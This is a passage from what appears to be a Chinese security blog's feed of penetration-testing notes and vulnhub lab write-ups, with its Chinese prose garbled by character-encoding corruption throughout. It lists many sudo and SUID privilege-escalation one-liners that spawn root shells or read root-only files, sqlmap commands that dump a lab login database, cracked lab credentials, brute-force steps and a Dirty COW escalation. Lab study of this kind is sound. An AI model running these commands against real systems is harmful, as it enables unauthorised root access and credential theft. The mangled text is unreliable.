æ¡†æ¶sqlæ³¨å…¥"><a href="#phpæ— æ¡†æ¶sqlæ³¨å…¥" class="headerlink" title="phpæ— æ¡†æ¶sqlæ³¨å…¥"></a>phpæ— æ¡†æ¶sqlæ³¨å…¥</h4><ul><li><p>ç»•è¿‡é­”æœ¯å¼•å· å®½å­—èŠ‚æ³¨å…¥ äºŒæ¬¡æ³¨å…¥</p></li><li><p>phpæºç å®¡è®¡å·¥å…·-&gt;æ•°æ®åº“ç›‘æ§  çœ‹æ•°æ®åº“äº¤äº’</p></li><li><p><strong>74cms äºŒæ¬¡æ³¨å…¥ å…ˆinsertå†update æ›´æ–°çš„æ—¶å€™è¯­å¥è¢«æ‰§è¡Œ</strong></p></li><li><p>æ•°æ®åº“ç›‘è§†è„šæœ¬ç½‘é¡µç‰ˆ(è¿è¡Œåœ¨webç«¯)</p></li><li><p><strong>maccmsæºç </strong> getæ–¹å¼ä¼šè¯†åˆ«urlç¼–ç  å¯ä»¥ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡å¼ºåˆ¶æ€§çš„ç¼–ç æ›¿æ¢</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ </tag>
      
      <tag>ç¬”è®°</tag>
      
      <tag>æ¸—é€æµ‹è¯•</tag>
      
      <tag>çŸ¥è¯†ç‚¹</tag>
      
      <tag>å°è¿ªå…¬å¼€è¯¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacksudoLPE</title>
    <link href="/2023/11/26/hacksudoLPE/"/>
    <url>/2023/11/26/hacksudoLPE/</url>
    
    <content type="html"><![CDATA[<h2 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h2><p>sudoææƒï¼Œå…±æœ‰30å…³</p><p><img src="/2023/11/26/hacksudoLPE/image-20231001144703604.png" alt="image-20231001144703604"></p><p>å„æŒ‡ä»¤ææƒ<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="apt-getææƒ"><a href="#apt-getææƒ" class="headerlink" title="apt-getææƒ"></a>apt-getææƒ</h3><ul><li><p>sudo -l æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°å¯ä»¥apt-get</p></li><li><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ææƒ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> changelog apt<br>!/bin/sh<br><span class="hljs-comment"># viluhacker</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001144538488.png" alt="image-20231001144538488"></p></li></ul><h3 id="arpè¶Šæƒè¯»æ–‡ä»¶"><a href="#arpè¶Šæƒè¯»æ–‡ä»¶" class="headerlink" title="arpè¶Šæƒè¯»æ–‡ä»¶"></a>arpè¶Šæƒè¯»æ–‡ä»¶</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">f</span>=file_to_read<br>sudo arp -v -f <span class="hljs-string">&quot;<span class="hljs-variable">$f</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001145509793.png" alt="image-20231001145509793"></p><h3 id="awkææƒ"><a href="#awkææƒ" class="headerlink" title="awkææƒ"></a>awkææƒ</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001193142947.png" alt="image-20231001193142947"></p><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base32</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base32</span> --decode<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001193635774.png" alt="image-20231001193635774"></p><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo comm <span class="hljs-regexp">/root/</span>root.txt <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å†™</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DATA&quot;</span> | sudo <span class="hljs-built_in">cp</span> /dev/stdin /root/root.txt<br><span class="hljs-comment"># è¯»</span><br>sudo <span class="hljs-built_in">cp</span> /root/root.txt /dev/stdin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> /bin/sh /bin/cp<br>sudo <span class="hljs-built_in">cp</span><br></code></pre></td></tr></table></figure><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo curl file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;&quot;</span> -f1 /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo dash</span><br></code></pre></td></tr></table></figure><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">date</span> -f /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo diff --line-format=%L <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo ftp<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo gcc -<span class="hljs-keyword">wrapper</span> /bin/sh,-s .<br></code></pre></td></tr></table></figure><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo gdb -nx -<span class="hljs-keyword">ex</span> <span class="hljs-string">&#x27;!sh&#x27;</span> -<span class="hljs-keyword">ex</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sudo</span> <span class="hljs-built_in">ip</span> -force -batch /root/root.txt<br></code></pre></td></tr></table></figure><h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo perl -e <span class="hljs-symbol">&#x27;exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;&#x27;<br></code></pre></td></tr></table></figure><h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> view -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo wget -i <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure><h3 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> watch -x sh -c &#x27;reset; exec sh <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo xxd /root/root.txt <span class="hljs-string">| xxd -r</span><br></code></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -u)<br>sudo zip <span class="hljs-variable">$TF</span> /etc/hosts -T -TT <span class="hljs-string">&#x27;sh #&#x27;</span><br>sudo <span class="hljs-built_in">rm</span> <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><h2 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h2><p>suidææƒ  å…±15å…³</p><p><img src="/2023/11/26/hacksudoLPE/image-20231002195530041.png" alt="image-20231002195530041"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ä»¥ä¸‹å‘½ä»¤ç”¨æ¥å‘ç°å¯ææƒçš„suidæ–‡ä»¶  <br><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br><span class="hljs-built_in">find</span> / -perm -4000 -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h2 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h2><p>ç‰¹æƒ capabilities æ»¥ç”¨</p><p><img src="/2023/11/26/hacksudoLPE/image-20231003140320108.png" alt="image-20231003140320108"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶è·å–çš„å†…æ ¸æƒé™<br>getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h2 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h2><p>ç¯å¢ƒå˜é‡</p><p><img src="/2023/11/26/hacksudoLPE/image-20231003140638303.png" alt="image-20231003140638303"></p>]]></content>
    
    
    
    <tags>
      
      <tag>è§£é¢˜è®°å½•</tag>
      
      <tag>vulnhub</tag>
      
      <tag>å­¦ä¹ </tag>
      
      <tag>ææƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhubé¶åœºæ—¥è®°</title>
    <link href="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"/>
    <url>/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>å…ˆé™„ä¸€ä»½ç½‘ä¸Šæ‰¾çš„éš¾æ˜“é¡ºåºå›¾ï¼Œç”±äºæ˜¯ä»é›¶å¼€å§‹ï¼Œè¿™é‡Œæ˜¯å…ˆæŠŠå®¹æ˜“çš„åšå®Œåå°è¯•äº†å‡ ä¸ªlatest</p><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/%E9%9A%BE%E6%98%93%E9%A1%BA%E5%BA%8F.png" alt="éš¾æ˜“é¡ºåº"></p><p>è¿™é‡Œåªæ”¾å‡ºäº†å‡ ä¸ªwriteupå†™çš„ç›¸å¯¹è¾ƒå®Œæ•´çš„è®°å½•</p><h3 id="doubletrouble1"><a href="#doubletrouble1" class="headerlink" title="doubletrouble1"></a>doubletrouble1</h3><h4 id="ç¬¬ä¸€å±‚"><a href="#ç¬¬ä¸€å±‚" class="headerlink" title="ç¬¬ä¸€å±‚"></a>ç¬¬ä¸€å±‚</h4><ol><li>æ‰«ip å‘ç°ç«¯å£</li><li>22 80</li><li>è®¿é—®80ç½‘é¡µï¼Œå‘ç°cms  qdpm 9.1</li><li>searchsploit qdpm 9.1 å‘ç°å­˜åœ¨rceæ¼æ´ä½†éœ€è¦ç™»å½•</li><li>dirbç›®å½•å‘ç° &#x2F;secret&#x2F;å›¾ç‰‡ å’Œ</li><li>éšå†™å·¥å…· steghide info æŸ¥çœ‹å›¾ç‰‡ä¿¡æ¯ï¼Œéœ€è¦å¯†ç   è¯´æ˜å­˜åœ¨éšè—ä¿¡æ¯</li><li>çˆ†ç ´å·¥å…· stegseek åˆ©ç”¨rockyouå­—å…¸çˆ†ç ´å‡ºå¯†ç ï¼Œè§£å¯†å‡ºéšå†™txt</li><li>txtä¸­å­˜åœ¨ç”¨æˆ·è´¦å·å¯†ç </li><li>ç™»å½•ç½‘é¡µåè¿”å›ç¬¬4æ­¥ï¼Œåˆ©ç”¨rceæ¼æ´æ‹¿åˆ°åé—¨</li><li>åé—¨ä¸ºgetæ–¹å¼è¯·æ±‚ï¼Œèšå‰‘å¤±æ•ˆï¼Œæ”¹ç”¨åå¼¹shell</li><li>æ‹¿åˆ°shellåæŸ¥çœ‹å¯æ‰§è¡Œsudoï¼Œå‘ç°å¯æ‰§è¡Œæ–‡ä»¶ &#x2F;usr&#x2F;bin&#x2F;awk</li><li>æœç´¢awkææƒï¼Œä¸€å¥è¯æ‹¿åˆ°root</li><li>&#x2F;root ç›®å½•ä¸‹å­˜åœ¨æ–°çš„ovaæ–‡ä»¶ï¼Œscpä¸‹è½½åˆ°kaliï¼Œå†å¯¼å…¥åˆ°æœ¬æœºç”¨vmwareæ‰“å¼€</li><li>ä¸Šä¸€æ­¥scpæ— æ³•ä½¿ç”¨ï¼Œæ”¹ç”¨pyhon    é¶æœºå¤„ python3 -m http.server 8888      kali wget <a href="http://ip:8888/%E6%96%87%E4%BB%B6">http://ip:8888/æ–‡ä»¶</a> ä¸‹è½½</li></ol><h4 id="ç¬¬äºŒå±‚"><a href="#ç¬¬äºŒå±‚" class="headerlink" title="ç¬¬äºŒå±‚"></a>ç¬¬äºŒå±‚</h4><ol><li><p>æ‰«ipï¼Œå‘ç°ç«¯å£22ï¼Œ80</p></li><li><p>æ‰«ç›®å½•ï¼Œæ²¡ä»€ä¹ˆå‘ç°</p></li><li><p>80ç«¯å£å­˜åœ¨ç™»å½•æ¡†ï¼Œç”¨sqlmapçˆ†ç ´</p></li><li><p>å‘ç°ç”¨æˆ·åunameå¤„å­˜åœ¨æ—¶é—´ç›²æ³¨ï¼Œçˆ†ç ´æ•°æ®åº“<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164041503.png" alt="image-20230919164041503"></p></li><li><p>é’ˆå¯¹doubletroubleåº“çˆ†ç ´è¡¨</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;uname=11&amp;psw=11&amp;btnLogin=Login&quot;</span> <span class="hljs-attr">--D</span> doubletrouble <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164241627.png" alt="image-20230919164241627"></p></li><li><p>çˆ†ç ´åˆ—</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users --columns --batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164620259.png" alt="image-20230919164620259"></p></li><li><p>çˆ†æ•°æ®</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C username --dump --batch</span><br><br><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.48.138/index.php&quot;</span> --data=<span class="hljs-comment">&quot;uname=11&amp;psw=</span><br><span class="hljs-number">11</span>&amp;btnLogin=Login<span class="hljs-comment">&quot; -D doubletrouble -T users -C password --dump --batch</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919164858731.png" alt="image-20230919164858731"><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230919165010345.png" alt="image-20230919165010345"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| username |</span><br><span class="hljs-section">+----------+</span><br>| clapton  |<br><span class="hljs-section">| montreux |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------+</span><br><span class="hljs-section">| password |</span><br><span class="hljs-section">+----------+</span><br>| GfsZxc1  |<br><span class="hljs-section">| ZubZub99 |</span><br><span class="hljs-section">+----------+</span><br></code></pre></td></tr></table></figure></li><li><p>webæ— æ³•ç™»å½•ï¼Œå°è¯•ssh</p></li><li><p>ssh <a href="mailto:&#99;&#x61;&#x6c;&#112;&#x74;&#111;&#x6e;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x34;&#x38;&#46;&#x31;&#x33;&#x38;">&#99;&#x61;&#x6c;&#112;&#x74;&#111;&#x6e;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x34;&#x38;&#46;&#x31;&#x33;&#x38;</a>  å¯†ç  ZubZub99 ç™»é™†æˆåŠŸ</p></li><li><p>è„ç‰›ææƒï¼Œæ‹¿flag</p></li></ol><h3 id="deathnote1"><a href="#deathnote1" class="headerlink" title="deathnote1"></a>deathnote1</h3><ol><li>æ‰«ipï¼Œå‘ç°ç«¯å£ 22 80</li><li>æ‰«ç›®å½•ï¼Œrobots.txt é‡Œé¢å‘ç°äº†ä»–çˆ¹çš„æç¤ºåœ¨ &#x2F;important.jpg</li><li>è®¿é—®&#x2F;important.jpg ï¼ŒæŠ“åŒ…å¾—åˆ°ä»–çˆ¹çš„æç¤º  è´¦å·åœ¨user.txt(ä¸ç”¨ä½ è¯´æˆ‘ä¹Ÿå‘ç°äº†)  å¯†ç åœ¨æŸä¸ªç½‘é¡µçš„æºç é‡Œ<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230920105133832.png" alt="image-20230920105133832"></li><li>è¿˜æ˜¯wordpressï¼Œè¿˜æ˜¯ä¸€çœ¼çš„uploadsæ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°user.txt å’Œ notes.txt, å…ˆä¿å­˜åœ¨æœ¬åœ°</li><li>å°è¯•è®¿é—®&#x2F;wordpress&#x2F;ï¼Œä¸€ç›´åŠ è½½ä¸­(æ±¤å§†ç”Ÿæ°”.jpg)ï¼Œ[ç›´æ¥wgetä¸‹è½½æºç ï¼Œreplaceæ‰€æœ‰çš„deathnote.vulnä¸º192.168.48.140 æœ¬åœ°è®¿é—®][ä¹Ÿå¯ä»¥ä¿®æ”¹hostæ–‡ä»¶]ï¼Œå‘ç°hintä¸­å­˜åœ¨ç–‘ä¼¼å¯†ç  iamjustic3 å…ˆä¿å­˜</li><li>å°è¯•hydra è¿›è¡Œsshçˆ†ç ´ï¼Œå¤§å°å†™éƒ½å¤±è´¥ï¼Œæ¢æ€è·¯</li><li>ç”¨wpscanæ‰«æï¼Œ-U user.txt -P password â€“api-token [token] æ‰«å‡ºæ¥äº†<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921111846366.png" alt="image-20230921111846366"></li><li>è®¿é—®&#x2F;wordpress&#x2F;wp-adminï¼Œ ç”¨å°å†™è´¦å·å¯†ç ç™»å½•ï¼ŒæˆåŠŸè¿›å…¥wpç®¡ç†é¡µé¢</li><li>åå°é¡µé¢ä¸è®©æ”¹ï¼Œmsfåˆ©ç”¨wp_admin_shell_upload ä¹Ÿä¸è¡Œ   é‡æ–°æ•´åˆå·²æœ‰æ•°æ®</li><li>notes.txté‡Œåƒæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå°è¯•hydra sshçˆ†ç ´ï¼Œå¯†ç ç”¨notes.txt, è·‘å‡ºæ¥ä¸€ä¸ª<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921140036952.png" alt="image-20230921140036952"></li><li>ssh è¿æ¥è¿› l ç”¨æˆ·ï¼Œå®¶ç›®å½•æœ‰user.txtï¼Œé‰´å®šä¸ºbrainfuckï¼Œç›´æ¥è§£ç <img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921140411876.png" alt="image-20230921140411876"></li><li>åœ¨opt&#x2F;L&#x2F;æ–‡ä»¶ä¸‹æœ‰ä¸ªæç¤ºï¼Œè®©çœ‹fakeæ–‡ä»¶å¤¹ï¼Œcdè¿›å»ï¼Œå‘ç°ä¸€ä¸ªhintå’Œä¸€æ®µwavæ–‡ä»¶</li><li>hintè®©ç”¨cyberchefï¼Œcat base.wav å¾—åˆ°ä¸€ä¸²æ•°å­—<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921142129436.png" alt="image-20230921142129436"></li><li>cyberchefåå¾—åˆ°å¯†ç  <img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921142226537.png" alt="image-20230921142226537" style="zoom: 80%;"></li><li>åˆ©ç”¨è´¦å·å¯†ç sshåˆ°kiraè´¦æˆ·ï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflag<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921142411444.png" alt="image-20230921142411444"></li><li>sudo -l å‘ç°all   ç›´æ¥sudo suåˆ°rootæƒé™ï¼Œcat &#x2F;root&#x2F;root.txt<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921143305226.png" alt="image-20230921143305226"></li></ol><p>CONGRAT!!!!!!!</p><h3 id="evalbox1"><a href="#evalbox1" class="headerlink" title="evalbox1"></a>evalbox1</h3><h4 id="æœ¬é¢˜æ–°çŸ¥è¯†"><a href="#æœ¬é¢˜æ–°çŸ¥è¯†" class="headerlink" title="æœ¬é¢˜æ–°çŸ¥è¯†"></a>æœ¬é¢˜æ–°çŸ¥è¯†</h4><ul><li>æ‰«æ–‡ä»¶æ—¶å¯ä»¥é’ˆå¯¹æ€§çš„åŠ åç¼€</li><li>å‚æ•°çˆ†ç ´</li><li>æ–‡ä»¶åŒ…å«æ¼æ´ï¼šå…ˆå°è¯•å†™å…¥æœ¨é©¬ï¼Œå¤±è´¥åæŸ¥çœ‹æ•æ„Ÿä¿¡æ¯</li><li>å¾—åˆ°ç”¨æˆ·ååå¯ä»¥å°è¯•ç”¨å­—å…¸çˆ†ç 